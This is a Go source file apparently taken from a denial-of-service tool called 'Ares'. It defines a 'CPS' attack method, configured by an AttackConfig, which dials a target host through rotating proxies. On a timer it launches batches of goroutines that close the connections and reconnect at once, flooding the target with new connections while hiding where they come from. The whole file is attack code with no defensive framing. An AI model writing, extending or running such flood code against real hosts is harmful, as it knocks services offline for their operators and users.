package methods

import (
	"Ares/core"
	"net"
	"time"
)

type CPS struct {
	Config     *core.AttackConfig
	isRunning  bool
	connBuffer chan net.Conn
	connPool   chan net.Conn
	done       chan struct{}
}

func (c *CPS) Start() {
	c.isRunning = true
	c.done = make(chan struct{})
	c.loop()
}

func (c *CPS) loop() {
	c.connBuffer = make(chan net.Conn, c.Config.PerDelay)
	c.connPool = make(chan net.Conn, c.Config.PerDelay)
	for i := 0; i < c.Config.PerDelay; i++ {
		c.connPool <- c.connect()
	}
	ticker := time.NewTicker(c.Config.Delay)
	defer ticker.Stop()
	for {
		select {
		case <-ticker.C:
			for i := 0; i < c.Config.PerDelay; i++ {
				go c.handleBatch()
			}
		case <-c.done:
			return
		}
	}
}

func (c *CPS) connect() net.Conn {
	conn, err := c.Config.ProxyManager.GetNext().Dial()(c.Config.Host)
	if err != nil {
		return nil
	}
	return conn
}

func (c *CPS) handleBatch() {
	conn := <-c.connPool
	c.connBuffer <- conn
	batch := make([]net.Conn, 0, c.Config.PerDelay)
	for i := 0; i < c.Config.PerDelay; i++ {
		conn, ok := <-c.connBuffer
		if !ok {
			break
		}
		batch = append(batch, conn)
	}
	for _, conn := range batch {
		conn.Close()
		c.connPool <- c.connect()
	}
}

func (c *CPS) Stop() {
	c.isRunning = false
	close(c.done)
}
